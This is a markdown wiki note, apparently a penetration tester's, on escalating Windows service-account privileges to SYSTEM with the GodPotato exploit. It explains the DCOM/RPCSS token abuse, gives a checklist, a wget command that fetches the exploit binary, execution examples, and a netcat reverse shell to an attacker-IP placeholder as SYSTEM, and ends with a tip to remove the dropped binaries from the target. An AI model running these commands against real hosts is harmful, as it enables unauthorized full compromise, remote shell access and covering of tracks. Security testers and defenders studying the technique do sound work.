---
created: 2026-07-21
updated: 2026-10-18
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---

## GodPotato

> [!abstract]+ **Scope**: Local Windows privilege escalation using the GodPotato exploit; system requirements and execution sequence on Windows 8.1 through Windows 11 and Windows Server 2012 through Windows Server 2022.

- [ ] Verify `SeImpersonatePrivilege` assignment using `whoami /priv`.
- [ ] Determine the target .NET Framework runtime version (3.5 vs 4.x).
- [ ] Transfer the matching GodPotato binary (`GodPotato-NET2.exe` or `GodPotato-NET4.exe`).
- [ ] Execute the payload binary or reverse shell command using the `-cmd` parameter.
- [ ] Verify `NT AUTHORITY\SYSTEM` execution context.

---

## How GodPotato works

- GodPotato abuses DCOM and RPCSS internal activation paths to elevate privileges from service accounts holding `SeImpersonatePrivilege` to `NT AUTHORITY\SYSTEM`.
- Earlier potato exploits faced specific operational boundaries:
  - [[🛠️ JuicyPotato]] is blocked on Windows 10 `1809`+ and Server 2019 because OXID resolution is restricted to TCP port `135`.
  - [[PrintSpoofer]] requires an active Print Spooler service (`spoolsv.exe`).
  - [[RoguePotato]] requires an accessible external listener on TCP port `135`.
- GodPotato bypasses all three constraints through the following execution steps:

  1. **Initiating DCOM activation**: GodPotato triggers DCOM object activation using a specific CLSID.
  2. **Forcing local RPCSS callbacks**: Instead of relying on `OBJREF` OXID redirects, GodPotato uses an activation path that forces `RPCSS` to initiate an authenticated callback to a local RPC server endpoint under your control. This bypasses the string binding restrictions introduced in `rpcss.dll`.
  3. **Capturing SYSTEM NTLM authentication**: The `RPCSS` service authenticates to GodPotato's local listener as `NT AUTHORITY\SYSTEM`.
  4. **Duplicating access tokens**: GodPotato extracts the impersonation token from the NTLM exchange, calls `DuplicateTokenEx()` to create a primary token, and calls `CreateProcessWithTokenW()` to launch the designated process.

> [!note] See [[Access tokens and impersonation]].

## Gathering prerequisite information

- Check active user privileges:

```powershell
whoami /priv
```

## Local privilege escalation via GodPotato

- Download the appropriate GodPotato binary on your attacker machine:

```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

- Execute a command as `SYSTEM`:

```powershell
GodPotato-NET4.exe -cmd "cmd /c whoami"
```

- Launch a reverse shell to your listener:

```powershell
GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <attacker_ip_address> 4444 -e cmd.exe"
```

### Command parameter reference

| Option | Description |
| :--- | :--- |
| `-cmd` | Specifies the command line string executed under the `NT AUTHORITY\SYSTEM` primary token. |

## Troubleshooting

- `.NET Unhandled Exception`
  - Target host lacks installed .NET 4.x runtime; use `GodPotato-NET2.exe` targeting .NET 2.0 / 3.5.
- `OpenProcessToken failed`
  - Current token lacks required rights; confirm `SeImpersonatePrivilege` presence in `whoami /priv` output.
- No reverse connection
  - Host firewall or EDR process blocking; test basic command execution to disk before triggering network sockets.

> [!tip]+
> - Run `whoami` inside the spawned process context to confirm execution as `NT AUTHORITY\SYSTEM`.
> - Remove transferred binaries (`GodPotato-NET4.exe`, `nc.exe`) from the target host upon task completion.

## References and further reading

- [`GodPotato — GitHub (BeichenDream)`](https://github.com/BeichenDream/GodPotato)
- [`GodPotato — HackTricks`](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html)
- [`Windows Privilege Escalation — Potatoes — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
